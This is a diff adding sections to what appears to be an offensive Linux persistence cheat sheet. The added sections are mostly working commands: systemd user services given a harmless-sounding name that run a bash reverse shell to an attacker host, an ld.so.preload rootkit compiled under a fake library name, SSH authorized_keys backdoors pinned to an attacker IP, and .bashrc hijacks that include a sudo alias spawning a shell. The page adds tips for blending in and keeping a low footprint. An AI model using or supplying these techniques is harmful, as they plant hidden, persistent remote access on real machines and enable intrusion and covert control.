@@ -47,6 +47,8 @@ ssh -i persistent_key <user>@10.10.10.10
     [Service]
     Type=simple
     ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1'
+    Restart=always
+    RestartSec=60
 
     [Install]
     WantedBy=multi-user.target
@@ -58,3 +60,79 @@ ssh -i persistent_key <user>@10.10.10.10
     systemctl enable persistence.service
     systemctl start persistence.service
     ```
+
+---
+
+## User-Level systemd Services (No Root Required)
+
+```bash
+mkdir -p ~/.config/systemd/user
+cat > ~/.config/systemd/user/update-check.service <<'EOF'
+[Unit]
+Description=Update checker
+
+[Service]
+Type=simple
+ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1'
+Restart=always
+
+[Install]
+WantedBy=default.target
+EOF
+
+systemctl --user enable --now update-check.service
+# Survives logout if linger is enabled:
+loginctl enable-linger $USER
+```
+
+---
+
+## `/etc/ld.so.preload`
+
+Every dynamically-linked binary (most of the system) loads libraries listed here at startup. Inject a shared object that runs on every command:
+
+```bash
+cat > /tmp/rk.c <<'EOF'
+#include <stdio.h>
+#include <stdlib.h>
+__attribute__((constructor)) void init(){
+    if(getuid()==0) system("bash -c 'bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1 &'");
+}
+EOF
+gcc -fPIC -shared -nostartfiles /tmp/rk.c -o /lib/x86_64-linux-gnu/libudev.so.9
+echo /lib/x86_64-linux-gnu/libudev.so.9 > /etc/ld.so.preload
+```
+
+!!! warning "Watch out"
+    `ld.so.preload` loads into *every* process — a broken library or crashing payload will brick the system. Test the .so in isolation first, and keep the payload wrapped in a UID check and a background fork to avoid stalling normal commands.
+
+---
+
+## SSH `authorized_keys` With `from=` Restriction
+
+Lock the backdoor to your attacker IP so it blends better and doesn't grant random scanners access:
+
+```bash
+echo 'from="203.0.113.5" ssh-rsa AAAA...' >> /root/.ssh/authorized_keys
+```
+
+Also consider `command=`:
+
+```bash
+echo 'command="/bin/bash",from="203.0.113.5" ssh-rsa AAAA...' >> /root/.ssh/authorized_keys
+```
+
+---
+
+## Shell RC File Hijack
+
+```bash
+# Runs every time the user starts an interactive shell
+echo 'bash -c "bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1" &' >> /root/.bashrc
+```
+
+Lower-footprint alternative — only fires when a specific command is run:
+
+```bash
+echo 'alias sudo="bash -c \"bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1\" &; /usr/bin/sudo"' >> /root/.bashrc
+```
